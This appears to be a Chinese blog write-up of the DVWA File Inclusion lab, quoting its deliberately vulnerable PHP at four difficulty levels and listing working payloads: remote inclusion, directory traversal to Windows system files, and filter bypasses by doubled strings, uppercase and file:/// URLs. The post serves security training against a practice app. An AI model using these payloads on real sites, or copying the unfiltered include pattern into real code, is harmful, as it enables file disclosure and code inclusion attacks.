---
layout: post
title: "DVWA File Inclusion (教學用)"
description: ""
date: 2023-07-11
categories:
  - DVWA
  - DVWA_File_Inclusion
author: ""
tags: ['DVWA', 'File_Inclusion']
---



#  DVWA File Inclusion (教學用)
###### tags: `DVWA`

## low


URL:
```
http://localhost/vulnerabilities/fi/?page=include.php
```




引入外部檔案
```
http://localhost/vulnerabilities/fi/?page=https://www.ea.com/zh-tw/games/apex-legends
```


目錄遍歷(我這邊自己在根目錄放了一個phpinfo.php )
```
http://localhost/vulnerabilities/fi/?page=../../phpinfo.php






../../../../c:\windows\system32\license.rtf
```

猜測大概就是 inlcude 或是 require 一個網頁。

* 差別:
include 引入文件的時候，如果碰到錯誤，會給出提示，並繼續運行下邊的代碼。
require 引入文件的時候，如果碰到錯誤，會給出提示，並停止運行下邊的代碼。




### low.php
```php!
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

?>
```


### index.php
```php
// if( count( $_GET ) )
if( isset( $file ) )
	include( $file );
else {
	header( 'Location:?page=include.php' );
	exit;
}

dvwaHtmlEcho( $page );

```

沒有任何過濾。



## medium



### code:
```php!

<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file );

?>
```

加上了一些過濾，不過都可以繞過


引入外部檔案
```
original
http://localhost/vulnerabilities/fi/?page=https://www.ea.com/zh-tw/games/apex-legends




雙寫:
http://localhost/vulnerabilities/fi/?page=hhttps://ttps://www.ea.com/zh-tw/games/apex-legends



大寫:
http://localhost/vulnerabilities/fi/?page=Https://www.ea.com/zh-tw/games/apex-legends


```


目錄遍歷(我這邊自己在根目錄放了一個phpinfo.php )
```
雙寫:
http://localhost/vulnerabilities/fi/?page=....//....//phpinfo.php


http://localhost/vulnerabilities/fi/?page=..../\..../\phpinfo.php


```




版本確認文件
```
c:\windows\system32\license.rtf

http://localhost/vulnerabilities/fi/?page=../../../../../../windows/system32/license.rtf

出現一堆文字把他copy 儲存為 xxx.rtf 就可以



c:\windows\system32\eula.txt

http://localhost/vulnerabilities/fi/?page=../../../../../../windows\system32\eula.txt

```


有時候你 url encode double encode 都可以幫你。


## high
```php!
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?>
```

白名單

一定要 file 開頭的
或是include.php


所以我們只能從 file 下手

本地文件協議:

```
http://localhost/vulnerabilities/fi/?page=file:///C:/Users/xxx/Desktop/DVWA-master/phpinfo.php
```
成功。


還有很多偽協議的騷操作，我之前做過，這邊就不舉例了。







### impossible


直接白名單
```php!
?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Only allow include.php or file{1..3}.php
if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?>
```